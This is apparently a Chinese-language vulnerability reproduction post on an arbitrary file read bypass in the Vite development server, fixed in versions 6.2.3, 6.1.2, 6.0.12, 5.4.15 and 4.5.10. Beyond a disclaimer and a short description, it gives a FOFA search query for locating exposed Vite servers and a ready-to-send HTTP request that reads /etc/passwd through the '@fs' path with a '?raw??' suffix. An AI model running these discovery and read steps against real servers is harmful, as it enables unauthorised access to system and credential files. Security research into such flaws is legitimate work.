#  漏洞复现 || Vite import存在任意文件读取漏洞   
韩文庚  我爱林   2025-04-17 10:18  
  
## 免责声明  
  
**我爱林攻防研究院的技术文章仅供参考，****任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得利用网络从事危害国家安全、荣誉和利益****，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他！！！**  
## 漏洞描述  
  
        Vite 是一款现代化的前端构建工具，旨在为 Web 项目提供更快速、更精简的开发体验。  
在  Vite 6.2.3、6.1.2、6.0.12、5.4.15 和 4.5.10  之前的版本中，存在一个安全漏洞（CNVD-2022-44615补丁的绕过），攻击者可通过在 URL  中附加特殊前缀（如"?raw??"或"?import&raw??"）结合"@fs"路径，绕过server.fs.deny的安全限制，从而读取Node.js进程有权访问的任意文件系统内容。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/JibM0LyR9LlOxWF03x7iaA2lHk4PX11LGozcAnWJXh5yFdldviatxklciaGbaiaR07dozhHLPVkGIg8PXy191NzLiaKA/640?wx_fmt=png&from=appmsg "")  
## 资产确定  
```
fofa： body="/@vite/client"
```  
## 漏洞复现  
  
1.利用如下PO  
C读取passwd  
```
GET /@fs/etc/passwd?raw?? HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/JibM0LyR9LlOxWF03x7iaA2lHk4PX11LGoFOWwybFpMIMZa4dD2UCWBNwmvhBfjoiaaJtZcXs1lZib1wRuqFibd5Gzg/640?wx_fmt=png&from=appmsg "")  
  
如有侵权，请联系删除  
  
感谢您抽出  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
.  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
.  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
来阅读本文  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
**点它，分享点赞在看都在这里**  
  
